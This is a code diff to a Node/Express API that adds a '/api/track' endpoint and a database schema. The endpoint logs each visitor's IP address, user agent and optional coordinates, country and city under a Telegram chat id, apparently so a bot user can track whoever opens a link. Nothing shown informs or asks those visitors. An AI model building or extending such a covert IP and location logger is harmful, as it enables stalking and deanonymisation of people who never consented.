@@ -1,3 +1,4 @@
+// api/index.js
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
@@ -19,6 +20,7 @@ console.log('DEBUG MONGODB_URI present:', !!process.env.MONGODB_URI);
 
 // ===== MONGODB CONNECTION =====
 let Location;
+let Click;            // <-- NEW model for tracker
 let connectPromise = null;
 
 if (process.env.MONGODB_URI) {
@@ -34,6 +36,7 @@ if (process.env.MONGODB_URI) {
       throw err;
     });
 
+  // Existing location schema (from original code)
   const locationSchema = new mongoose.Schema({
     lat: String,
     lon: String,
@@ -44,7 +47,29 @@ if (process.env.MONGODB_URI) {
 
   Location = mongoose.model('Location', locationSchema);
 
-  // LOCATION ENDPOINT (Mongo mode)
+  // ==============================
+  // NEW: Tracker schema (locations collection)
+  // ==============================
+  const clickSchema = new mongoose.Schema(
+    {
+      owner_id: String,   // Telegram chat id
+      ip: String,
+      ua: String,
+      lat: Number,
+      lon: Number,
+      country: String,
+      city: String,
+      path: String,
+      ts: { type: Date, default: Date.now }
+    },
+    { collection: 'locations' } // same collection name jo bot use kar raha hai
+  );
+
+  Click = mongoose.models.Click || mongoose.model('Click', clickSchema);
+
+  // =======================================
+  // EXISTING: LOCATION ENDPOINT (Mongo mode)
+  // =======================================
   app.post('/api/location', async (req, res) => {
     try {
       // Connection ready hone ka wait
@@ -78,6 +103,53 @@ if (process.env.MONGODB_URI) {
     } catch (err) {
       console.error('❌ Error (Mongo mode):', err);
       res.status(500).json({ status: 'error', error: err.message });
+    }
+  });
+
+  // =======================================
+  // NEW: TRACK ENDPOINT (for Telegram bot)
+  // =======================================
+  app.get('/api/track', async (req, res) => {
+    try {
+      if (connectPromise) {
+        await connectPromise;
+      }
+
+      const { uid } = req.query; // Telegram user chat id
+      if (!uid) {
+        return res.status(400).json({ error: 'uid query param required' });
+      }
+
+      const ip =
+        (req.headers['x-forwarded-for'] &&
+          req.headers['x-forwarded-for'].split(',')[0].trim()) ||
+        req.socket?.remoteAddress ||
+        'unknown';
+
+      const ua = req.headers['user-agent'] || 'unknown';
+
+      // Optional: agar tu frontend se lat/lon/country/city bhejta hai
+      const { lat, lon, country, city } = req.query;
+
+      const doc = new Click({
+        owner_id: String(uid),
+        ip,
+        ua,
+        lat: lat ? Number(lat) : undefined,
+        lon: lon ? Number(lon) : undefined,
+        country: country || undefined,
+        city: city || undefined,
+        path: req.url
+      });
+
+      await doc.save();
+
+      console.log('✅ Tracker hit saved for owner_id:', uid);
+
+      return res.status(200).json({ ok: true });
+    } catch (err) {
+      console.error('❌ Error in /api/track:', err);
+      return res.status(500).json({ error: 'Internal error' });
     }
   });
 } else {
